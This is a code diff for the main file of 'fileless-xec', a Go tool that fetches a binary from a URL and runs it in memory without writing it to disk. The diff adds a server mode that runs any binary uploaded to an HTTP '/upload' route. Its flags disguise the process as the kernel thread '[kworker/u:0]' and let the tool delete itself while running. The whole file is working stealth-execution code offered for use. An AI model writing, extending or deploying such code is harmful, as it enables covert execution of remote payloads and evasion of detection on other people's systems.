@@ -1,22 +1,16 @@
 package main
 
 import (
+	"fileless-xec/pkg/config"
 	"fileless-xec/pkg/exec"
+	"fileless-xec/pkg/server"
 	"fileless-xec/pkg/transport"
-	"fmt"
+	"log"
+	"net/http"
 	"os"
-	"runtime"
 
 	"github.com/spf13/cobra"
 )
-
-//Remove current file while its execution
-func selfRemove() {
-	err := os.Remove("./fileless-xec")
-	if err != nil {
-		fmt.Println(err)
-	}
-}
 
 func main() {
 
@@ -47,36 +41,34 @@ func main() {
 				binaryRaw = transport.GetBinaryRaw(url)
 			}
 
-			if unstealth || runtime.GOOS == "windows" { //Unstealth mode
-				binary := "dummy"
-				if runtime.GOOS == "windows" {
-					binary += ".exe"
-				}
-				//write binary file locally
-				err := exec.WriteBinaryFile(binary, binaryRaw)
-				if err != nil {
-					fmt.Println(err)
-				}
-				//execute it
-				err = exec.UnstealthyExec(binary, argsExec, environ)
-				fmt.Println(err)
+			cfg := &config.Config{BinaryContent: binaryRaw, Unstealth: unstealth, ArgsExec: argsExec, SelfRm: selfRm, Environ: environ}
 
-				if selfRm && runtime.GOOS != "windows" {
-					selfRemove()
-				}
-			} else { //Stealth mode
+			exec.Filelessxec(cfg)
+		},
+	}
 
-				mfd := exec.PrepareStealthExec(binaryRaw)
-				defer mfd.Close()
-				fd := mfd.Fd()
+	//SERvER MODE
 
-				if selfRm && runtime.GOOS != "windows" {
-					selfRemove()
-				}
+	var cmdServer = &cobra.Command{
+		Use:   "server [port]",
+		Short: "Use fileless-xec as a server to upload binary file and then execute it",
+		Args:  cobra.MinimumNArgs(1),
+		Run: func(cmd *cobra.Command, args []string) {
+			port := ":" + args[0]
 
-				exec.Fexecve(fd, argsExec, environ)
+			// get argument for binary execution
+			argsExec := []string{name}
+			argsExec = append(argsExec, args[1:]...) //argument if binary execution need them fileless-xec <binary_url> -- <flags> <values>
+			environ := os.Environ()
+			cfg := &config.Config{Unstealth: unstealth, ArgsExec: argsExec, SelfRm: selfRm, Environ: environ}
+			// Upload route
+			http.HandleFunc("/upload", server.UploadAndExecHandler(cfg))
+
+			//Listen
+			err := http.ListenAndServe(port, nil)
+			if err != nil {
+				log.Fatal(err)
 			}
-
 		},
 	}
 
@@ -84,7 +76,8 @@ func main() {
 	cmdFilelessxec.PersistentFlags().StringVarP(&name, "name", "n", "[kworker/u:0]", "running process name")
 	cmdFilelessxec.PersistentFlags().BoolVarP(&http3, "http3", "Q", false, "use of HTTP3 (QUIC) protocol")
 	cmdFilelessxec.PersistentFlags().BoolVarP(&selfRm, "self-remove", "r", false, "remove fileless-xec while its execution (only on Linux). fileless-xec must be in the same repository that the excution process")
-	cmdFilelessxec.PersistentFlags().BoolVarP(&unstealth, "unstealth", "u", false, "store the file locally on disk before executing it")
+	cmdFilelessxec.PersistentFlags().BoolVarP(&unstealth, "unstealth", "u", false, "store the file locally on disk before executing it. Not stealth, but useful if your system does not support mem_fd syscall")
 
+	cmdFilelessxec.AddCommand(cmdServer)
 	cmdFilelessxec.Execute()
 }
